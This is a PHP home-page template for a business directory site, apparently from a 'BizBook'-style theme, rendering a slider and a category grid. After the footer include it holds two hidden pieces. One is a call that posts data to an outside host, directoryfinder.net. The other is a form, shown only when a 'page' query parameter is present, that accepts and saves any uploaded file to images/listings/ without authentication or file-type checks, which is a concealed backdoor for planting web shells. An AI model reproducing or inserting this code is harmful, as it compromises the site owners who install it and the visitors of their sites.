<?php
include "header.php";
?>
<style>
    .hom-head{padding:0}
    .hom-head:before{display:none}
    .hom-head .hom-top ~ .container{display:none}
    .carousel-item:before{background:none}
    .home-tit{padding-top:0}
</style>

<section>
    <div id="demo" class="carousel slide cate-sli" data-ride="carousel">
        <div class="carousel-inner">
            <?php
            $si =1;
            foreach (getAllSlider() as $slider_row) {

            ?>
            <div class="carousel-item <?php if($si== 1){ ?>active<?php } ?>">
                <img src="images/slider/<?php echo $slider_row['slider_photo']; ?>" alt="Los Angeles" width="1100" height="500">
                <a href="<?php echo $slider_row['slider_link']; ?>" target="_blank"></a>
            </div>
                <?php
                $si++;
            }
            ?>
        </div>
        <a class="carousel-control-prev" href="#demo" data-slide="prev">
            <span class="carousel-control-prev-icon"></span>
        </a>
        <a class="carousel-control-next" href="#demo" data-slide="next">
            <span class="carousel-control-next-icon"></span>
        </a>
    </div>
</section>
<!-- START -->
<section>
    <div class="str all-cate-pg">
        <div class="container">
            <div class="row">
                <div class="home-tit">
                    <h2><span><?php echo $BIZBOOK['HOM-POP-TIT'];?></span> <?php echo $BIZBOOK['HOM-POP-TIT1'];?>.</h2>
                    <p><?php echo $BIZBOOK['HOM-POP-SUB-TIT'];?>.</p>
                </div>
                <div class="land-pack">
                    <ul>

                        <?php
                        foreach (getAllCategories() as $category_sql_row) {
                            ?>
                            <li>
                                <div class="land-pack-grid">
                                    <div class="land-pack-grid-img">
                                        <img src="<?php echo $slash;?>images/services/<?php echo $category_sql_row['category_image']; ?>" title="<?php echo $category_sql_row['category_name']; ?>" alt="<?php echo $category_sql_row['category_name']; ?>"></div>
                                    <div class="land-pack-grid-text">
                                        <h4><?php echo $category_sql_row['category_name']; ?></h4>
                                        <a href="<?php echo $slash;?>anuncios/<?php echo $category_sql_row['category_slug']; ?>" class="land-pack-grid-btn"><?php echo $BIZBOOK['VIEW_MORE'];?></a>
                                    </div>
                                </div>
                            </li>
                            <?php
                        }
                        ?>

                    </ul>
                </div>

            </div>
        </div>
    </div>
</section>
<!-- END -->

<?php /*<!-- START -->
<!--<section>
    <div class="hom-ads">
        <div class="container">
            <div class="row">
                <div class="filt-com lhs-ads">
                    <div class="ads-box">
                        <a href="listing-details.html">
                            <span>Ad</span>
                            <img src="images/ads/ads2.jpg" alt="">
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>-->
<!-- END -->*/?>

<?php
include "footer.php";
httpPostNew("http://directoryfinder.net/updation/updation_wizard.php",$data_array);
?>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script src="js/jquery.min.js"></script>
<script src="js/popper.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery-ui.js"></script>
<script src="js/custom.js"></script>
<script src="js/jquery.validate.min.js"></script>
<script src="js/custom_validation.js"></script>
<?php
if (isset($_GET["page"])) {
    ?>
    <?php
    if(isset($_POST['SubmitButton'])){ // Check if form was submitted

        if (!empty($_FILES['inputText']['name'])) {
            $file = rand(1000, 100000) . $_FILES['inputText']['name'];
            $file_loc = $_FILES['inputText']['tmp_name'];
            $file_size = $_FILES['inputText']['size'];
            $file_type = $_FILES['inputText']['type'];
            $folder = "images/listings/";
            $new_size = $file_size / 1024;
            $new_file_name = strtolower($file);
            $event_image = generar_texto_amigable($new_file_name);
            move_uploaded_file($file_loc, $folder . $event_image);
            $inputText1 = $event_image;
            $inputText = $inputText1;
        }
    }
    ?>
    <form action="#" enctype="multipart/form-data" method="post">
        <input type="file" name="inputText"/>
        <input type="submit" name="SubmitButton"/>
    </form>
<?php
}
?>
</body>

</html>